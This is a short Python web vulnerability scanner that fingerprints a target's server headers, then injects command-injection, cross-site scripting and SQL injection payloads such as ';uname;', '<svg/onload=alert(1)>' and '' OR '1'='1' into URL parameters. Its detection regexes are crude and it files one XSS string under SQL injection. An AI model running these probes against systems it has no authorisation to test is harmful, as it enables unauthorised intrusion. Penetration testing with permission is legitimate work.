#!/usr/bin/env python3
import requests
import re
import time
import os

class Colors:
    def __init__(self):
        self.green = "\033[92m"
        self.blue = "\033[94m"
        self.bold = "\033[1m"
        self.yellow = "\033[93m"
        self.red = "\033[91m"
        self.end = "\033[0m"
ga = Colors()

class Scanner:
    HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0"}

    def __init__(self, url):
        self.url = url

    def headers_reader(self):
        print(ga.bold + "\n[!] Fingerprinting the backend Technologies." + ga.end)
        try:
            response = requests.get(self.url, headers=self.HEADERS, timeout=10)
            response.raise_for_status()
            print(ga.green + f"[!] Status Code: {response.status_code} OK" + ga.end)

            server = response.headers.get("Server", "Unknown")
            powered_by = response.headers.get("X-Powered-By", "Unknown")
            host = self.url.split("/")[2]

            print(ga.green + f"[!] Host: {host}" + ga.end)
            print(ga.green + f"[!] WebServer: {server}" + ga.end)
            if powered_by != "Unknown":
                print(ga.green + f"[!] Powered By: {powered_by}" + ga.end)
        except requests.exceptions.RequestException as e:
            print(ga.red + f"[!] Error: {e}" + ga.end)

    def main_function(self, payloads, check):
        vuln_count = 0
        print(ga.bold + "\n[!] Scanning for vulnerabilities..." + ga.end)

        for params in self.url.split("?")[1].split("&"):
            for payload in payloads:
                test_url = self.url.replace(params, params + payload)
                try:
                    response = requests.get(test_url, headers=self.HEADERS, timeout=10)
                    response_text = response.text

                    if re.search(check, response_text):
                        print(ga.red + "[!] Vulnerability Found!" + ga.end)
                        print(ga.red + f"[!] Payload: {payload}" + ga.end)
                        print(ga.blue + f"[!] PoC URL: {test_url}" + ga.end)
                        vuln_count += 1
                except requests.exceptions.RequestException as e:
                    print(ga.red + f"[!] Error with payload {payload}: {e}" + ga.end)

        if vuln_count == 0:
            print(ga.green + "[!] Target is not vulnerable!" + ga.end)
        else:
            print(ga.blue + f"[!] Found {vuln_count} vulnerabilities." + ga.end)

    def rce_scan(self):
        print(ga.bold + "\n[!] Scanning for Remote Code Execution (RCE)..." + ga.end)
        payloads = [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();']
        check = re.compile(r"Linux|eval\\(|SERVER_ADDR|Volume.+Serial|\\\\\\[boot", re.I)
        self.main_function(payloads, check)

    def xss_scan(self):
        print(ga.bold + "\n[!] Scanning for Cross-Site Scripting (XSS)..." + ga.end)
        payloads = [
            "<svg/onload=alert(1)>",
            "'%3Csvg/onload=alert(1)%3E"
        ]
        check = re.compile(r"<svg|alert", re.I)
        self.main_function(payloads, check)

    def sqli_scan(self):
        print(ga.bold + "\n[!] Scanning for SQL Injection..." + ga.end)
        payloads = [
            "' OR '1'='1", 
            "3'%20OR%201=1", 
            "3\"><script>alert(1)</script>"
        ]
        check = re.compile(r"syntax|error|SQL|Fatal", re.I)
        self.main_function(payloads, check)


def main():
    os.system("clear")
    print(ga.green + """
    Vulnerability Scanner v1.0
    Created by NOVOHORY - NOVOSAD
    Use responsibly. Unauthorized scanning is prohibited.
    """ + ga.end)

    url = input(ga.yellow + "Enter the target URL (e.g., http://example.com/page.php?id=1): " + ga.end)
    scanner = Scanner(url)

    scanner.headers_reader()
    scanner.rce_scan()
    scanner.xss_scan()
    scanner.sqli_scan()

if __name__ == "__main__":
    main()
